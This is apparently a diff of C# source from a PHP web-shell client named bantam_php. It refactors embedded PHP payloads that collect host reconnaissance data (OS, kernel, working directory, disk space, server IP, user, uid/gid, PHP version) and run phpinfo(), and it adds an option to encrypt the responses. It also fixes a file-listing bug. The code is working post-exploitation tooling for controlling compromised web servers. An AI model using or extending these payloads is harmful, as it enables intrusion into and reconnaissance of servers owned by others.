@@ -60,52 +60,86 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        public static string initDataVars = @"
-            $os = 'nix';
-            if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ $os = 'win'; }
-
-            $cwd = @dirname(__FILE__);
-            $freeSpace  = @diskfreespace($cwd);
-            $totalSpace = @disk_total_space($cwd);
-            $totalSpace = $totalSpace ? $totalSpace : 1;
-            $release	= @php_uname('r');
-            $kernel	 = @php_uname('s');
-            $serverIP =  $_SERVER['SERVER_ADDR'];
-            $serverSoftware = @getenv('SERVER_SOFTWARE');
-            $phpVersion = phpversion();
-		
-            if (!function_exists('posix_getegid')) {
-	            $user  = @get_current_user();
-	            $uid   = @getmyuid();
-	            $gid   = @getmygid();
-	            $group = '?';
+        /// 
+        public static string InitShellData(bool encryptResponse)
+        {
+            string responseCode = "";
+            if (encryptResponse) {
+                responseCode = @"$result = $os.'" + colSeperator
+                     + "'.$cwd.'" + colSeperator
+                     + "'.$freeSpace.'" + colSeperator
+                     + "'.$totalSpace.'" + colSeperator
+                     + "'.$release.'" + colSeperator
+                     + "'.$kernel.'" + colSeperator
+                     + "'.$serverIP.'" + colSeperator
+                     + "'.$serverSoftware.'" + colSeperator
+                     + "'.$user.'" + colSeperator
+                     + "'.$uid.'" + colSeperator
+                     + "'.$gid.'" + colSeperator
+                     + "'.$group.'" + colSeperator
+                     + "'.$phpVersion;" 
+                     + EncryptionHelper.encryptPhpResult();
             } else {
-	            $uid   = @posix_getpwuid(posix_geteuid());
-	            $gid   = @posix_getgrgid(posix_getegid());
-
-	            $user  = $uid['name'];
-	            $uid   = $uid['uid'];
-	            $gid   = $gid['gid'];
-	            $group = $gid['name'];
+                responseCode = @"echo $os.'" + colSeperator
+                     + "'.$cwd.'" + colSeperator
+                     + "'.$freeSpace.'" + colSeperator
+                     + "'.$totalSpace.'" + colSeperator
+                     + "'.$release.'" + colSeperator
+                     + "'.$kernel.'" + colSeperator
+                     + "'.$serverIP.'" + colSeperator
+                     + "'.$serverSoftware.'" + colSeperator
+                     + "'.$user.'" + colSeperator
+                     + "'.$uid.'" + colSeperator
+                     + "'.$gid.'" + colSeperator
+                     + "'.$group.'" + colSeperator
+                    + "'.$phpVersion;";
             }
-            echo $os.'" + colSeperator
-             + "'.$cwd.'" + colSeperator
-             + "'.$freeSpace.'" + colSeperator
-             + "'.$totalSpace.'" + colSeperator
-             + "'.$release.'" + colSeperator
-             + "'.$kernel.'" + colSeperator
-             + "'.$serverIP.'" + colSeperator
-             + "'.$serverSoftware.'" + colSeperator
-             + "'.$user.'" + colSeperator
-             + "'.$uid.'" + colSeperator
-             + "'.$gid.'" + colSeperator
-             + "'.$group.'" + colSeperator
-            + "'.$phpVersion;";
+
+            return @"
+                $os = 'nix';
+                if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ $os = 'win'; }
+
+                $cwd = @dirname(__FILE__);
+                $freeSpace  = @diskfreespace($cwd);
+                $totalSpace = @disk_total_space($cwd);
+                $totalSpace = $totalSpace ? $totalSpace : 1;
+                $release	= @php_uname('r');
+                $kernel	 = @php_uname('s');
+                $serverIP =  $_SERVER['SERVER_ADDR'];
+                $serverSoftware = @getenv('SERVER_SOFTWARE');
+                $phpVersion = phpversion();
+		
+                if (!function_exists('posix_getegid')) {
+	                $user  = @get_current_user();
+	                $uid   = @getmyuid();
+	                $gid   = @getmygid();
+	                $group = '?';
+                } else {
+	                $uid   = @posix_getpwuid(posix_geteuid());
+	                $gid   = @posix_getgrgid(posix_getegid());
+
+	                $user  = $uid['name'];
+	                $uid   = $uid['uid'];
+	                $gid   = $gid['gid'];
+	                $group = $gid['name'];
+                }" + responseCode;
+        }
 
         /// <summary>
         /// 
         /// </summary>
-        public static string phpInfo = "phpinfo();";
+        /// <param name="code"></param>
+        /// <param name="encryptResponse"></param>
+        /// <returns></returns>
+        public static string PhpInfo(bool encryptResponse)
+        {
+            if (encryptResponse) {
+                return "ob_start(); phpinfo(); $result = ob_get_contents(); ob_end_clean();"
+                       + EncryptionHelper.encryptPhpResult();
+            } else {
+                return "phpinfo();";
+            }
+        }
 
         /// <summary>
         /// 
@@ -253,7 +287,7 @@ namespace bantam_php
                    + "'.$file['path'].'" + colSeperator
                    + "'.$file['size'].'" + colSeperator
                    + "'.$file['type'].'" + colSeperator
-                   + "'.$dir['perms'].'" + rowSeperator + @"';
+                   + "'.$file['perms'].'" + rowSeperator + @"';
                     }";
             }
 
